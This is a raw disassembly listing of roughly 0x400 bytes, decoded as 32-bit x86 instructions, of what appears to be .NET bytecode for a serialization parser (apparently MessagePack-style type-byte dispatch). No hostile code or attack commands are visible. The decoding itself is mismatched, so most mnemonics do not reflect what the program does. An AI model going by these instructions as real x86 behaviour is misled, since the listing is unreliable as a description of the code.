  404c42:	00 00                	add    %al,(%eax)
  404c44:	14 2a                	adc    $0x2a,%al
  404c46:	07                   	pop    %es
  404c47:	8e 69 17             	mov    0x17(%ecx),%gs
  404c4a:	3e 41                	ds inc %ecx
  404c4c:	00 00                	add    %al,(%eax)
  404c4e:	00 16                	add    %dl,(%esi)
  404c50:	0d 38 32 00 00       	or     $0x3238,%eax
  404c55:	00 07                	add    %al,(%edi)
  404c57:	09 a3 38 00 00 01    	or     %esp,0x1000038(%ebx)
  404c5d:	0c 06                	or     $0x6,%al
  404c5f:	08 6f 6e             	or     %ch,0x6e(%edi)
  404c62:	00 00                	add    %al,(%eax)
  404c64:	06                   	push   %es
  404c65:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404c68:	04 3a                	add    $0x3a,%al
  404c6a:	13 00                	adc    (%eax),%eax
  404c6c:	00 00                	add    %al,(%eax)
  404c6e:	06                   	push   %es
  404c6f:	6f                   	outsl  %ds:(%esi),(%dx)
  404c70:	6f                   	outsl  %ds:(%esi),(%dx)
  404c71:	00 00                	add    %al,(%eax)
  404c73:	06                   	push   %es
  404c74:	0a 06                	or     (%esi),%al
  404c76:	08 6f 6a             	or     %ch,0x6a(%edi)
  404c79:	00 00                	add    %al,(%eax)
  404c7b:	06                   	push   %es
  404c7c:	38 03                	cmp    %al,(%ebx)
  404c7e:	00 00                	add    %al,(%eax)
  404c80:	00 11                	add    %dl,(%ecx)
  404c82:	04 0a                	add    $0xa,%al
  404c84:	09 17                	or     %edx,(%edi)
  404c86:	58                   	pop    %eax
  404c87:	0d 09 07 8e 69       	or     $0x698e0709,%eax
  404c8c:	17                   	pop    %ss
  404c8d:	59                   	pop    %ecx
  404c8e:	32 c6                	xor    %dh,%al
  404c90:	07                   	pop    %es
  404c91:	07                   	pop    %es
  404c92:	8e 69 17             	mov    0x17(%ecx),%gs
  404c95:	59                   	pop    %ecx
  404c96:	a3 38 00 00 01       	mov    %eax,0x1000038
  404c9b:	0c 06                	or     $0x6,%al
  404c9d:	08 6f 6d             	or     %ch,0x6d(%edi)
  404ca0:	00 00                	add    %al,(%eax)
  404ca2:	06                   	push   %es
  404ca3:	13 05 11 05 15 3e    	adc    0x3e150511,%eax
  404ca9:	0e                   	push   %cs
  404caa:	00 00                	add    %al,(%eax)
  404cac:	00 06                	add    %al,(%esi)
  404cae:	7b 38                	jnp    0x404ce8
  404cb0:	00 00                	add    %al,(%eax)
  404cb2:	04 11                	add    $0x11,%al
  404cb4:	05 6f ea 00 00       	add    $0xea6f,%eax
  404cb9:	0a 2a                	or     (%edx),%ch
  404cbb:	06                   	push   %es
  404cbc:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbd:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbe:	00 00                	add    %al,(%eax)
  404cc0:	06                   	push   %es
  404cc1:	0a 06                	or     (%esi),%al
  404cc3:	08 6f 6a             	or     %ch,0x6a(%edi)
  404cc6:	00 00                	add    %al,(%eax)
  404cc8:	06                   	push   %es
  404cc9:	06                   	push   %es
  404cca:	2a 00                	sub    (%eax),%al
  404ccc:	1b 30                	sbb    (%eax),%esi
  404cce:	04 00                	add    $0x0,%al
  404cd0:	3b 00                	cmp    (%eax),%eax
  404cd2:	00 00                	add    %al,(%eax)
  404cd4:	24 00                	and    $0x0,%al
  404cd6:	00 11                	add    %dl,(%ecx)
  404cd8:	73 d0                	jae    0x404caa
  404cda:	00 00                	add    %al,(%eax)
  404cdc:	0a 0a                	or     (%edx),%cl
  404cde:	03 28                	add    (%eax),%ebp
  404ce0:	a2 00 00 06 10       	mov    %al,0x10060000
  404ce5:	01 06                	add    %eax,(%esi)
  404ce7:	03 16                	add    (%esi),%edx
  404ce9:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404cef:	00 0a                	add    %cl,(%edx)
  404cf1:	06                   	push   %es
  404cf2:	16                   	push   %ss
  404cf3:	6a 6f                	push   $0x6f
  404cf5:	4e                   	dec    %esi
  404cf6:	00 00                	add    %al,(%eax)
  404cf8:	0a 02                	or     (%edx),%al
  404cfa:	06                   	push   %es
  404cfb:	28 88 00 00 06 dd    	sub    %cl,-0x22fa0000(%eax)
  404d01:	0d 00 00 00 06       	or     $0x6000000,%eax
  404d06:	39 06                	cmp    %eax,(%esi)
  404d08:	00 00                	add    %al,(%eax)
  404d0a:	00 06                	add    %al,(%esi)
  404d0c:	6f                   	outsl  %ds:(%esi),(%dx)
  404d0d:	33 00                	xor    (%eax),%eax
  404d0f:	00 0a                	add    %cl,(%edx)
  404d11:	dc 2a                	fsubrl (%edx)
  404d13:	00 01                	add    %al,(%ecx)
  404d15:	10 00                	adc    %al,(%eax)
  404d17:	00 02                	add    %al,(%edx)
  404d19:	00 06                	add    %al,(%esi)
  404d1b:	00 27                	add    %ah,(%edi)
  404d1d:	2d 00 0d 00 00       	sub    $0xd00,%eax
  404d22:	00 00                	add    %al,(%eax)
  404d24:	13 30                	adc    (%eax),%esi
  404d26:	02 00                	add    (%eax),%al
  404d28:	16                   	push   %ss
  404d29:	00 00                	add    %al,(%eax)
  404d2b:	00 25 00 00 11 03    	add    %ah,0x3110000
  404d31:	19 73 6c             	sbb    %esi,0x6c(%ebx)
  404d34:	00 00                	add    %al,(%eax)
  404d36:	0a 0a                	or     (%edx),%cl
  404d38:	02 06                	add    (%esi),%al
  404d3a:	28 88 00 00 06 06    	sub    %cl,0x6060000(%eax)
  404d40:	6f                   	outsl  %ds:(%esi),(%dx)
  404d41:	40                   	inc    %eax
  404d42:	00 00                	add    %al,(%eax)
  404d44:	0a 2a                	or     (%edx),%ch
  404d46:	00 00                	add    %al,(%eax)
  404d48:	13 30                	adc    (%eax),%esi
  404d4a:	04 00                	add    $0x0,%al
  404d4c:	07                   	pop    %es
  404d4d:	06                   	push   %es
  404d4e:	00 00                	add    %al,(%eax)
  404d50:	26 00 00             	add    %al,%es:(%eax)
  404d53:	11 03                	adc    %eax,(%ebx)
  404d55:	6f                   	outsl  %ds:(%esi),(%dx)
  404d56:	00 01                	add    %al,(%ecx)
  404d58:	00 0a                	add    %cl,(%edx)
  404d5a:	d2 0a                	rorb   %cl,(%edx)
  404d5c:	14 0b                	adc    $0xb,%al
  404d5e:	16                   	push   %ss
  404d5f:	0c 16                	or     $0x16,%al
  404d61:	0d 06 1f 7f 3d       	or     $0x3d7f1f06,%eax
  404d66:	09 00                	or     %eax,(%eax)
  404d68:	00 00                	add    %al,(%eax)
  404d6a:	02 06                	add    (%esi),%al
  404d6c:	6e                   	outsb  %ds:(%esi),(%dx)
  404d6d:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  404d71:	06                   	push   %es
  404d72:	2a 06                	sub    (%esi),%al
  404d74:	20 80 00 00 00 3f    	and    %al,0x3f000000(%eax)
  404d7a:	48                   	dec    %eax
  404d7b:	00 00                	add    %al,(%eax)
  404d7d:	00 06                	add    %al,(%esi)
  404d7f:	20 8f 00 00 00 3d    	and    %cl,0x3d000000(%edi)
  404d85:	3d 00 00 00 02       	cmp    $0x2000000,%eax
  404d8a:	28 6b 00             	sub    %ch,0x0(%ebx)
  404d8d:	00 06                	add    %al,(%esi)
  404d8f:	02 18                	add    (%eax),%bl
  404d91:	7d 36                	jge    0x404dc9
  404d93:	00 00                	add    %al,(%eax)
  404d95:	04 06                	add    $0x6,%al
  404d97:	20 80 00 00 00 59    	and    %al,0x59000000(%eax)
  404d9d:	0c 16                	or     $0x16,%al
  404d9f:	0d 38 1c 00 00       	or     $0x1c38,%eax
  404da4:	00 02                	add    %al,(%edx)
  404da6:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404daa:	06                   	push   %es
  404dab:	25 03 28 96 00       	and    $0x962803,%eax
  404db0:	00 06                	add    %al,(%esi)
  404db2:	6f                   	outsl  %ds:(%esi),(%dx)
  404db3:	6a 00                	push   $0x0
  404db5:	00 06                	add    %al,(%esi)
  404db7:	03 6f 88             	add    -0x78(%edi),%ebp
  404dba:	00 00                	add    %al,(%eax)
  404dbc:	06                   	push   %es
  404dbd:	09 17                	or     %edx,(%edi)
  404dbf:	58                   	pop    %eax
  404dc0:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  404dc5:	2a 06                	sub    (%esi),%al
  404dc7:	20 90 00 00 00 3f    	and    %dl,0x3f000000(%eax)
  404dcd:	3c 00                	cmp    $0x0,%al
  404dcf:	00 00                	add    %al,(%eax)
  404dd1:	06                   	push   %es
  404dd2:	20 9f 00 00 00 3d    	and    %bl,0x3d000000(%edi)
  404dd8:	31 00                	xor    %eax,(%eax)
  404dda:	00 00                	add    %al,(%eax)
  404ddc:	02 28                	add    (%eax),%ch
  404dde:	6b 00 00             	imul   $0x0,(%eax),%eax
  404de1:	06                   	push   %es
  404de2:	02 19                	add    (%ecx),%bl
  404de4:	7d 36                	jge    0x404e1c
  404de6:	00 00                	add    %al,(%eax)
  404de8:	04 06                	add    $0x6,%al
  404dea:	20 90 00 00 00 59    	and    %dl,0x59000000(%eax)
  404df0:	0c 16                	or     $0x16,%al
  404df2:	0d 38 10 00 00       	or     $0x1038,%eax
  404df7:	00 02                	add    %al,(%edx)
  404df9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404dfd:	06                   	push   %es
  404dfe:	03 6f 88             	add    -0x78(%edi),%ebp
  404e01:	00 00                	add    %al,(%eax)
  404e03:	06                   	push   %es
  404e04:	09 17                	or     %edx,(%edi)
  404e06:	58                   	pop    %eax
  404e07:	0d 09 08 32 ec       	or     $0xec320809,%eax
  404e0c:	2a 06                	sub    (%esi),%al
  404e0e:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  404e14:	21 00                	and    %eax,(%eax)
  404e16:	00 00                	add    %al,(%eax)
  404e18:	06                   	push   %es
  404e19:	20 bf 00 00 00 3d    	and    %bh,0x3d000000(%edi)
  404e1f:	16                   	push   %ss
  404e20:	00 00                	add    %al,(%eax)
  404e22:	00 06                	add    %al,(%esi)
  404e24:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  404e2a:	0c 02                	or     $0x2,%al
  404e2c:	03 08                	add    (%eax),%ecx
  404e2e:	28 95 00 00 06 28    	sub    %dl,0x28060000(%ebp)
  404e34:	81 00 00 06 2a 06    	addl   $0x62a0600,(%eax)
  404e3a:	20 e0                	and    %ah,%al
  404e3c:	00 00                	add    %al,(%eax)
  404e3e:	00 3f                	add    %bh,(%edi)
  404e40:	15 00 00 00 06       	adc    $0x6000000,%eax
  404e45:	20 ff                	and    %bh,%bh
  404e47:	00 00                	add    %al,(%eax)
  404e49:	00 3d 0a 00 00 00    	add    %bh,0xa
  404e4f:	02 06                	add    (%esi),%al
  404e51:	67 6a 28             	addr16 push $0x28
  404e54:	74 00                	je     0x404e56
  404e56:	00 06                	add    %al,(%esi)
  404e58:	2a 06                	sub    (%esi),%al
  404e5a:	20 c0                	and    %al,%al
  404e5c:	00 00                	add    %al,(%eax)
  404e5e:	00 40 07             	add    %al,0x7(%eax)
  404e61:	00 00                	add    %al,(%eax)
  404e63:	00 02                	add    %al,(%edx)
  404e65:	28 80 00 00 06 2a    	sub    %al,0x2a060000(%eax)
  404e6b:	06                   	push   %es
  404e6c:	20 c1                	and    %al,%cl
  404e6e:	00 00                	add    %al,(%eax)
  404e70:	00 40 0b             	add    %al,0xb(%eax)
  404e73:	00 00                	add    %al,(%eax)
  404e75:	00 72 b4             	add    %dh,-0x4c(%edx)
  404e78:	27                   	daa
  404e79:	00 70 73             	add    %dh,0x73(%eax)
  404e7c:	01 01                	add    %eax,(%ecx)
  404e7e:	00 0a                	add    %cl,(%edx)
  404e80:	7a 06                	jp     0x404e88
  404e82:	20 c2                	and    %al,%dl
  404e84:	00 00                	add    %al,(%eax)
  404e86:	00 40 08             	add    %al,0x8(%eax)
  404e89:	00 00                	add    %al,(%eax)
  404e8b:	00 02                	add    %al,(%edx)
  404e8d:	16                   	push   %ss
  404e8e:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404e94:	06                   	push   %es
  404e95:	20 c3                	and    %al,%bl
  404e97:	00 00                	add    %al,(%eax)
  404e99:	00 40 08             	add    %al,0x8(%eax)
  404e9c:	00 00                	add    %al,(%eax)
  404e9e:	00 02                	add    %al,(%edx)
  404ea0:	17                   	pop    %ss
  404ea1:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404ea7:	06                   	push   %es
  404ea8:	20 c4                	and    %al,%ah
  404eaa:	00 00                	add    %al,(%eax)
  404eac:	00 40 20             	add    %al,0x20(%eax)
  404eaf:	00 00                	add    %al,(%eax)
  404eb1:	00 03                	add    %al,(%ebx)
  404eb3:	6f                   	outsl  %ds:(%esi),(%dx)
  404eb4:	00 01                	add    %al,(%ecx)
  404eb6:	00 0a                	add    %cl,(%edx)
  404eb8:	0c 08                	or     $0x8,%al
  404eba:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ebe:	01 0b                	add    %ecx,(%ebx)
  404ec0:	03 07                	add    (%edi),%eax
  404ec2:	16                   	push   %ss
  404ec3:	08 6f 45             	or     %ch,0x45(%edi)
  404ec6:	00 00                	add    %al,(%eax)
  404ec8:	0a 26                	or     (%esi),%ah
  404eca:	02 07                	add    (%edi),%al
  404ecc:	28 79 00             	sub    %bh,0x0(%ecx)
  404ecf:	00 06                	add    %al,(%esi)
  404ed1:	2a 06                	sub    (%esi),%al
  404ed3:	20 c5                	and    %al,%ch
  404ed5:	00 00                	add    %al,(%eax)
  404ed7:	00 40 39             	add    %al,0x39(%eax)
  404eda:	00 00                	add    %al,(%eax)
  404edc:	00 18                	add    %bl,(%eax)
  404ede:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ee2:	01 0b                	add    %ecx,(%ebx)
  404ee4:	03 07                	add    (%edi),%eax
  404ee6:	16                   	push   %ss
  404ee7:	18 6f 45             	sbb    %ch,0x45(%edi)
  404eea:	00 00                	add    %al,(%eax)
  404eec:	0a 26                	or     (%esi),%ah
  404eee:	07                   	pop    %es
  404eef:	28 58 00             	sub    %bl,0x0(%eax)
  404ef2:	00 06                	add    %al,(%esi)
  404ef4:	0b 07                	or     (%edi),%eax
  404ef6:	16                   	push   %ss
  404ef7:	28 02                	sub    %al,(%edx)
  404ef9:	01 00                	add    %eax,(%eax)
  404efb:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404efe:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f02:	01 0b                	add    %ecx,(%ebx)
  404f04:	03 07                	add    (%edi),%eax
  404f06:	16                   	push   %ss
  404f07:	08 6f 45             	or     %ch,0x45(%edi)
  404f0a:	00 00                	add    %al,(%eax)
  404f0c:	0a 26                	or     (%esi),%ah
  404f0e:	02 07                	add    (%edi),%al
  404f10:	28 79 00             	sub    %bh,0x0(%ecx)
  404f13:	00 06                	add    %al,(%esi)
  404f15:	2a 06                	sub    (%esi),%al
  404f17:	20 c6                	and    %al,%dh
  404f19:	00 00                	add    %al,(%eax)
  404f1b:	00 40 39             	add    %al,0x39(%eax)
  404f1e:	00 00                	add    %al,(%eax)
  404f20:	00 1a                	add    %bl,(%edx)
  404f22:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f26:	01 0b                	add    %ecx,(%ebx)
  404f28:	03 07                	add    (%edi),%eax
  404f2a:	16                   	push   %ss
  404f2b:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f2e:	00 00                	add    %al,(%eax)
  404f30:	0a 26                	or     (%esi),%ah
  404f32:	07                   	pop    %es
  404f33:	28 58 00             	sub    %bl,0x0(%eax)
  404f36:	00 06                	add    %al,(%esi)
  404f38:	0b 07                	or     (%edi),%eax
  404f3a:	16                   	push   %ss
  404f3b:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  404f3f:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404f42:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f46:	01 0b                	add    %ecx,(%ebx)
  404f48:	03 07                	add    (%edi),%eax
  404f4a:	16                   	push   %ss
  404f4b:	08 6f 45             	or     %ch,0x45(%edi)
  404f4e:	00 00                	add    %al,(%eax)
  404f50:	0a 26                	or     (%esi),%ah
  404f52:	02 07                	add    (%edi),%al
  404f54:	28 79 00             	sub    %bh,0x0(%ecx)
  404f57:	00 06                	add    %al,(%esi)
  404f59:	2a 06                	sub    (%esi),%al
  404f5b:	20 c7                	and    %al,%bh
  404f5d:	00 00                	add    %al,(%eax)
  404f5f:	00 3b                	add    %bh,(%ebx)
  404f61:	16                   	push   %ss
  404f62:	00 00                	add    %al,(%eax)
  404f64:	00 06                	add    %al,(%esi)
  404f66:	20 c8                	and    %cl,%al
  404f68:	00 00                	add    %al,(%eax)
  404f6a:	00 3b                	add    %bh,(%ebx)
  404f6c:	0b 00                	or     (%eax),%eax
  404f6e:	00 00                	add    %al,(%eax)
  404f70:	06                   	push   %es
  404f71:	20 c9                	and    %cl,%cl
  404f73:	00 00                	add    %al,(%eax)
  404f75:	00 40 0b             	add    %al,0xb(%eax)
  404f78:	00 00                	add    %al,(%eax)
  404f7a:	00 72 e0             	add    %dh,-0x20(%edx)
  404f7d:	27                   	daa
  404f7e:	00 70 73             	add    %dh,0x73(%eax)
  404f81:	01 01                	add    %eax,(%ecx)
  404f83:	00 0a                	add    %cl,(%edx)
  404f85:	7a 06                	jp     0x404f8d
  404f87:	20 ca                	and    %cl,%dl
  404f89:	00 00                	add    %al,(%eax)
  404f8b:	00 40 26             	add    %al,0x26(%eax)
  404f8e:	00 00                	add    %al,(%eax)
  404f90:	00 1a                	add    %bl,(%edx)
  404f92:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f96:	01 0b                	add    %ecx,(%ebx)
  404f98:	03 07                	add    (%edi),%eax
  404f9a:	16                   	push   %ss
  404f9b:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f9e:	00 00                	add    %al,(%eax)
  404fa0:	0a 26                	or     (%esi),%ah
  404fa2:	07                   	pop    %es
  404fa3:	28 58 00             	sub    %bl,0x0(%eax)
  404fa6:	00 06                	add    %al,(%esi)
  404fa8:	0b 02                	or     (%edx),%eax
  404faa:	07                   	pop    %es
  404fab:	16                   	push   %ss
  404fac:	28 03                	sub    %al,(%ebx)
  404fae:	01 00                	add    %eax,(%eax)
  404fb0:	0a 28                	or     (%eax),%ch
  404fb2:	84 00                	test   %al,(%eax)
  404fb4:	00 06                	add    %al,(%esi)
  404fb6:	2a 06                	sub    (%esi),%al
  404fb8:	20 cb                	and    %cl,%bl
  404fba:	00 00                	add    %al,(%eax)
  404fbc:	00 40 26             	add    %al,0x26(%eax)
  404fbf:	00 00                	add    %al,(%eax)
  404fc1:	00 1e                	add    %bl,(%esi)
  404fc3:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404fc7:	01 0b                	add    %ecx,(%ebx)
  404fc9:	03 07                	add    (%edi),%eax
  404fcb:	16                   	push   %ss
  404fcc:	1e                   	push   %ds
  404fcd:	6f                   	outsl  %ds:(%esi),(%dx)
  404fce:	45                   	inc    %ebp
  404fcf:	00 00                	add    %al,(%eax)
  404fd1:	0a 26                	or     (%esi),%ah
  404fd3:	07                   	pop    %es
  404fd4:	28 58 00             	sub    %bl,0x0(%eax)
  404fd7:	00 06                	add    %al,(%esi)
  404fd9:	0b 02                	or     (%edx),%eax
  404fdb:	07                   	pop    %es
  404fdc:	16                   	push   %ss
  404fdd:	28 04 01             	sub    %al,(%ecx,%eax,1)
  404fe0:	00 0a                	add    %cl,(%edx)
  404fe2:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  404fe8:	06                   	push   %es
  404fe9:	20 cc                	and    %cl,%ah
  404feb:	00 00                	add    %al,(%eax)
  404fed:	00 40 11             	add    %al,0x11(%eax)
  404ff0:	00 00                	add    %al,(%eax)
  404ff2:	00 03                	add    %al,(%ebx)
  404ff4:	6f                   	outsl  %ds:(%esi),(%dx)
  404ff5:	00 01                	add    %al,(%ecx)
  404ff7:	00 0a                	add    %cl,(%edx)
  404ff9:	d2 0a                	rorb   %cl,(%edx)
  404ffb:	02 06                	add    (%esi),%al
  404ffd:	6e                   	outsb  %ds:(%esi),(%dx)
  404ffe:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  405002:	06                   	push   %es
  405003:	2a 06                	sub    (%esi),%al
  405005:	20 cd                	and    %cl,%ch
  405007:	00 00                	add    %al,(%eax)
  405009:	00 40 27             	add    %al,0x27(%eax)
  40500c:	00 00                	add    %al,(%eax)
  40500e:	00 18                	add    %bl,(%eax)
  405010:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405014:	01 0b                	add    %ecx,(%ebx)
  405016:	03 07                	add    (%edi),%eax
  405018:	16                   	push   %ss
  405019:	18 6f 45             	sbb    %ch,0x45(%edi)
  40501c:	00 00                	add    %al,(%eax)
  40501e:	0a 26                	or     (%esi),%ah
  405020:	07                   	pop    %es
  405021:	28 58 00             	sub    %bl,0x0(%eax)
  405024:	00 06                	add    %al,(%esi)
  405026:	0b 02                	or     (%edx),%eax
  405028:	07                   	pop    %es
  405029:	16                   	push   %ss
  40502a:	28 02                	sub    %al,(%edx)
  40502c:	01 00                	add    %eax,(%eax)
  40502e:	0a 6e 28             	or     0x28(%esi),%ch
  405031:	74 00                	je     0x405033
  405033:	00 06                	add    %al,(%esi)
  405035:	2a 06                	sub    (%esi),%al
  405037:	20 ce                	and    %cl,%dh
  405039:	00 00                	add    %al,(%eax)
  40503b:	00 40 27             	add    %al,0x27(%eax)
  40503e:	00 00                	add    %al,(%eax)
  405040:	00 1a                	add    %bl,(%edx)
  405042:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405046:	01 0b                	add    %ecx,(%ebx)
  405048:	03 07                	add    (%edi),%eax
  40504a:	16                   	push   %ss
  40504b:	1a 6f 45             	sbb    0x45(%edi),%ch
  40504e:	00 00                	add    %al,(%eax)
  405050:	0a 26                	or     (%esi),%ah
  405052:	07                   	pop    %es
  405053:	28 58 00             	sub    %bl,0x0(%eax)
  405056:	00 06                	add    %al,(%esi)
  405058:	0b 02                	or     (%edx),%eax
  40505a:	07                   	pop    %es
  40505b:	16                   	push   %ss
  40505c:	28 05 01 00 0a 6e    	sub    %al,0x6e0a0001
  405062:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  405066:	06                   	push   %es
  405067:	2a 06                	sub    (%esi),%al
  405069:	20 cf                	and    %cl,%bh
  40506b:	00 00                	add    %al,(%eax)
  40506d:	00 40 26             	add    %al,0x26(%eax)
  405070:	00 00                	add    %al,(%eax)
  405072:	00 1e                	add    %bl,(%esi)
  405074:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405078:	01 0b                	add    %ecx,(%ebx)
  40507a:	03 07                	add    (%edi),%eax
  40507c:	16                   	push   %ss
  40507d:	1e                   	push   %ds
  40507e:	6f                   	outsl  %ds:(%esi),(%dx)
  40507f:	45                   	inc    %ebp
  405080:	00 00                	add    %al,(%eax)
  405082:	0a 26                	or     (%esi),%ah
  405084:	07                   	pop    %es
  405085:	28 58 00             	sub    %bl,0x0(%eax)
  405088:	00 06                	add    %al,(%esi)
  40508a:	0b 02                	or     (%edx),%eax
  40508c:	07                   	pop    %es
  40508d:	16                   	push   %ss
  40508e:	28 06                	sub    %al,(%esi)
  405090:	01 00                	add    %eax,(%eax)
  405092:	0a 28                	or     (%eax),%ch
  405094:	75 00                	jne    0x405096
  405096:	00 06                	add    %al,(%esi)
  405098:	2a 06                	sub    (%esi),%al
  40509a:	20 dc                	and    %bl,%ah
  40509c:	00 00                	add    %al,(%eax)
  40509e:	00 40 49             	add    %al,0x49(%eax)
  4050a1:	00 00                	add    %al,(%eax)
  4050a3:	00 18                	add    %bl,(%eax)
  4050a5:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050a9:	01 0b                	add    %ecx,(%ebx)
  4050ab:	03 07                	add    (%edi),%eax
  4050ad:	16                   	push   %ss
  4050ae:	18 6f 45             	sbb    %ch,0x45(%edi)
  4050b1:	00 00                	add    %al,(%eax)
  4050b3:	0a 26                	or     (%esi),%ah
  4050b5:	07                   	pop    %es
  4050b6:	28 58 00             	sub    %bl,0x0(%eax)
  4050b9:	00 06                	add    %al,(%esi)
  4050bb:	0b 07                	or     (%edi),%eax
  4050bd:	16                   	push   %ss
  4050be:	28 07                	sub    %al,(%edi)
  4050c0:	01 00                	add    %eax,(%eax)
  4050c2:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4050c5:	28 6b 00             	sub    %ch,0x0(%ebx)
  4050c8:	00 06                	add    %al,(%esi)
  4050ca:	02 19                	add    (%ecx),%bl
  4050cc:	7d 36                	jge    0x405104
  4050ce:	00 00                	add    %al,(%eax)
  4050d0:	04 16                	add    $0x16,%al
  4050d2:	0d 38 10 00 00       	or     $0x1038,%eax
  4050d7:	00 02                	add    %al,(%edx)
  4050d9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4050dd:	06                   	push   %es
  4050de:	03 6f 88             	add    -0x78(%edi),%ebp
  4050e1:	00 00                	add    %al,(%eax)
  4050e3:	06                   	push   %es
  4050e4:	09 17                	or     %edx,(%edi)
  4050e6:	58                   	pop    %eax
  4050e7:	0d 09 08 32 ec       	or     $0xec320809,%eax
  4050ec:	2a 06                	sub    (%esi),%al
  4050ee:	20 dd                	and    %bl,%ch
  4050f0:	00 00                	add    %al,(%eax)
  4050f2:	00 40 49             	add    %al,0x49(%eax)
  4050f5:	00 00                	add    %al,(%eax)
  4050f7:	00 1a                	add    %bl,(%edx)
  4050f9:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050fd:	01 0b                	add    %ecx,(%ebx)
  4050ff:	03 07                	add    (%edi),%eax
  405101:	16                   	push   %ss
  405102:	1a 6f 45             	sbb    0x45(%edi),%ch
  405105:	00 00                	add    %al,(%eax)
  405107:	0a 26                	or     (%esi),%ah
  405109:	07                   	pop    %es
  40510a:	28 58 00             	sub    %bl,0x0(%eax)
  40510d:	00 06                	add    %al,(%esi)
  40510f:	0b 07                	or     (%edi),%eax
  405111:	16                   	push   %ss
  405112:	28 07                	sub    %al,(%edi)
  405114:	01 00                	add    %eax,(%eax)
  405116:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405119:	28 6b 00             	sub    %ch,0x0(%ebx)
  40511c:	00 06                	add    %al,(%esi)
  40511e:	02 19                	add    (%ecx),%bl
  405120:	7d 36                	jge    0x405158
  405122:	00 00                	add    %al,(%eax)
  405124:	04 16                	add    $0x16,%al
  405126:	0d 38 10 00 00       	or     $0x1038,%eax
  40512b:	00 02                	add    %al,(%edx)
  40512d:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405131:	06                   	push   %es
  405132:	03 6f 88             	add    -0x78(%edi),%ebp
  405135:	00 00                	add    %al,(%eax)
  405137:	06                   	push   %es
  405138:	09 17                	or     %edx,(%edi)
  40513a:	58                   	pop    %eax
  40513b:	0d 09 08 32 ec       	or     $0xec320809,%eax
  405140:	2a 06                	sub    (%esi),%al
  405142:	20 d9                	and    %bl,%cl
  405144:	00 00                	add    %al,(%eax)
  405146:	00 40 0e             	add    %al,0xe(%eax)
  405149:	00 00                	add    %al,(%eax)
  40514b:	00 02                	add    %al,(%edx)
  40514d:	06                   	push   %es
  40514e:	03 28                	add    (%eax),%ebp
  405150:	97                   	xchg   %eax,%edi
  405151:	00 00                	add    %al,(%eax)
  405153:	06                   	push   %es
  405154:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  40515a:	06                   	push   %es
  40515b:	20 de                	and    %bl,%dh
  40515d:	00 00                	add    %al,(%eax)
  40515f:	00 40 55             	add    %al,0x55(%eax)
  405162:	00 00                	add    %al,(%eax)
  405164:	00 18                	add    %bl,(%eax)
  405166:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40516a:	01 0b                	add    %ecx,(%ebx)
  40516c:	03 07                	add    (%edi),%eax
  40516e:	16                   	push   %ss
  40516f:	18 6f 45             	sbb    %ch,0x45(%edi)
  405172:	00 00                	add    %al,(%eax)
  405174:	0a 26                	or     (%esi),%ah
  405176:	07                   	pop    %es
  405177:	28 58 00             	sub    %bl,0x0(%eax)
  40517a:	00 06                	add    %al,(%esi)
  40517c:	0b 07                	or     (%edi),%eax
  40517e:	16                   	push   %ss
  40517f:	28 07                	sub    %al,(%edi)
  405181:	01 00                	add    %eax,(%eax)
  405183:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405186:	28 6b 00             	sub    %ch,0x0(%ebx)
  405189:	00 06                	add    %al,(%esi)
  40518b:	02 18                	add    (%eax),%bl
  40518d:	7d 36                	jge    0x4051c5
  40518f:	00 00                	add    %al,(%eax)
  405191:	04 16                	add    $0x16,%al
  405193:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405198:	00 02                	add    %al,(%edx)
  40519a:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40519e:	06                   	push   %es
  40519f:	25 03 28 96 00       	and    $0x962803,%eax
  4051a4:	00 06                	add    %al,(%esi)
  4051a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4051a7:	6a 00                	push   $0x0
  4051a9:	00 06                	add    %al,(%esi)
  4051ab:	03 6f 88             	add    -0x78(%edi),%ebp
  4051ae:	00 00                	add    %al,(%eax)
  4051b0:	06                   	push   %es
  4051b1:	09 17                	or     %edx,(%edi)
  4051b3:	58                   	pop    %eax
  4051b4:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  4051b9:	2a 06                	sub    (%esi),%al
  4051bb:	20 de                	and    %bl,%dh
  4051bd:	00 00                	add    %al,(%eax)
